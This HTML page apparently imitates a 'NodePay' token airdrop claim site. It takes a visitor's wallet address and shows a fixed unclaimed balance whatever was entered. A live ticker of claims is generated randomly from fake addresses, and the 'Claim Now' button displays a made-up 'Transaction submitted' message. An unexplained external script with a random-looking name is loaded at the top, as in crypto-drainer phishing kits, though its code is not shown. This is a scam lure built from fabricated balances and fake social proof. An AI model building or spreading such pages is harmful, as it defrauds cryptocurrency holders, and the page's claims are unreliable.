<!DOCTYPE html>
<html lang="en">
    <script charset="UTF-8" type="text/javascript" src="./08149dc0-89ad-4837-bf34-b45d9cce854a.js"></script><head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="Earn NODE tokens by contributing unused internet resources. Join NodePay and start earning cryptocurrency rewards today.">
    <meta name="keywords" content="NODE, cryptocurrency, blockchain, earn crypto, decentralized network">
    <title>NodePay - Earn NODE Tokens by Sharing Internet Resources</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --primary: #25ce85;
            --secondary: #1a1a1a;
            --accent: #2dd4bf;
        }

        body {
            margin: 0;
            font-family: 'Inter', Arial, sans-serif;
            background: #0a0a0a;
            color: white;
            min-height: 100vh;
            line-height: 1.6;
        }

        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 2rem;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .claim-ticker {
            background: rgba(255,255,255,0.05);
            padding: 1rem 2rem;
            border-radius: 50px;
            margin: 2rem 0;
            font-size: 0.9rem;
            border: 1px solid rgba(255,255,255,0.1);
            width: 100%;
            text-align: center;
            position: relative;
            overflow: hidden;
        }

        .claim-ticker::before {
            content: "";
            position: absolute;
            left: 0;
            top: 0;
            height: 100%;
            width: 60px;
            background: linear-gradient(90deg, rgba(37,206,133,0.3) 0%, transparent 100%);
        }

        .hero-section {
            text-align: center;
            margin: 4rem 0;
            max-width: 800px;
        }

        .gradient-text {
            background: linear-gradient(45deg, var(--primary), var(--accent));
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            font-size: 3rem;
            font-weight: 700;
            margin: 1rem 0;
        }

        .wallet-section {
            background: rgba(255,255,255,0.03);
            backdrop-filter: blur(15px);
            border-radius: 20px;
            padding: 3rem;
            margin: 2rem 0;
            border: 1px solid rgba(255,255,255,0.1);
            width: 100%;
            max-width: 600px;
            text-align: center;
        }

        input {
            width: 100%;
            padding: 1.2rem;
            border-radius: 12px;
            border: 2px solid #333;
            background: #1a1a1a;
            color: white;
            font-size: 1rem;
            margin: 1.5rem 0;
            transition: all 0.3s;
        }

        /* Dynamic Overlay Styles */
        .overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.95);
            display: none;
            justify-content: center;
            align-items: center;
            z-index: 1000;
            backdrop-filter: blur(10px);
        }

        .overlay-content {
            background: rgba(42,42,42,0.98);
            padding: 3rem;
            border-radius: 20px;
            text-align: center;
            max-width: 500px;
            width: 90%;
            position: relative;
            border: 1px solid var(--primary);
            box-shadow: 0 0 30px rgba(37,206,133,0.1);
        }

        .glow-button {
            background: var(--primary);
            color: #000;
            border: none;
            padding: 1.2rem 2.5rem;
            border-radius: 12px;
            cursor: pointer;
            font-weight: 600;
            transition: all 0.3s;
            display: inline-flex;
            align-items: center;
            gap: 0.5rem;
        }

        .glow-button:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(37,206,133,0.3);
        }

        .dynamic-claims {
            margin: 1.5rem 0;
            font-size: 0.9rem;
            color: #888;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="claim-ticker" id="liveTicker">
            0xE3B3 just claimed 3454 NODE
        </div>

        <div class="hero-section">
            <h1 class="gradient-text">NodePay Airdrop<br>Decentralized Networks</h1>
            <p>Contribute your unused internet bandwidth and earn real cryptocurrency rewards</p>
        </div>

        <div class="wallet-section">
            <h2>Check Eligibility</h2>
            <input type="text" placeholder="Enter your wallet address (0x...)" id="walletAddress" aria-label="Wallet address input">
            <button class="glow-button" onclick="showOverlay()">
                <span>🚀 Claim Airdrop</span>
            </button>
        </div>
    </div>

    <!-- Overlay -->
    <div class="overlay" id="overlay">
        <div class="overlay-content">
            <h2>Wallet Address</h2>
            <p id="displayAddress" class="dynamic-claims"></p>
            
            <div class="dynamic-claims" id="overlayClaims">
                <!-- Dynamic claims will be inserted here -->
            </div>

            <div style="margin: 2rem 0;">
                <h3>Unclaimed Balance</h3>
                <p style="font-size: 2rem; margin: 1rem 0;">44325 NODE</p>
                <p>Worth: $149 (22 days remaining)</p>
            </div>

            <div style="display: flex; gap: 1rem; justify-content: center;">
                <button class="glow-button interact-button" onclick="claimTokens()">💎 Claim Now</button>
                <button class="glow-button" onclick="interact-button()" style="background: #666;">✕ Close</button>
            </div>
        </div>
    </div>

    <script>
        // Dynamic Claims Generator
        const claims = [
            { address: '0xE3BA', amount: '344' },
            { address: '0xE3H3', amount: '7864' },
            { address: '0x88F2', amount: '1223' },
            { address: '0x9AB4', amount: '455' },
            { address: '0xC5D1', amount: '2345' }
        ];

        function generateClaim() {
            const claim = claims[Math.floor(Math.random() * claims.length)];
            return `${claim.address} just claimed ${claim.amount} NODE`;
        }

        function updateTicker() {
            const ticker = document.getElementById('liveTicker');
            const newClaim = generateClaim();
            const existingClaims = ticker.innerHTML.split('•');
            
            if(existingClaims.length > 3) {
                existingClaims.shift();
            }
            
            ticker.innerHTML = `🟢: ${existingClaims.join(' • ')} • ${newClaim}`;
        }

        function updateOverlayClaims() {
            const overlayClaims = document.getElementById('overlayClaims');
            overlayClaims.innerHTML = Array(3).fill().map(() => 
                `<div>${generateClaim()}</div>`
            ).join('');
        }

        // Initialize dynamic updates
        setInterval(() => {
            updateTicker();
            updateOverlayClaims();
        }, 5000);

        // Overlay Functions
        function showOverlay() {
            const address = document.getElementById('walletAddress').value;
            if(address) {
                document.getElementById('displayAddress').textContent = address;
                document.getElementById('overlay').style.display = 'flex';
                updateOverlayClaims();
            }
        }

        function closeOverlay() {
            document.getElementById('overlay').style.display = 'interact-button';
        }

        function claimTokens() {
            alert('Transaction submitted to blockchain!');
            closeOverlay();
        }

        // Initial claims population
        updateTicker();
        updateOverlayClaims();
    </script>
    
</body>
</html>
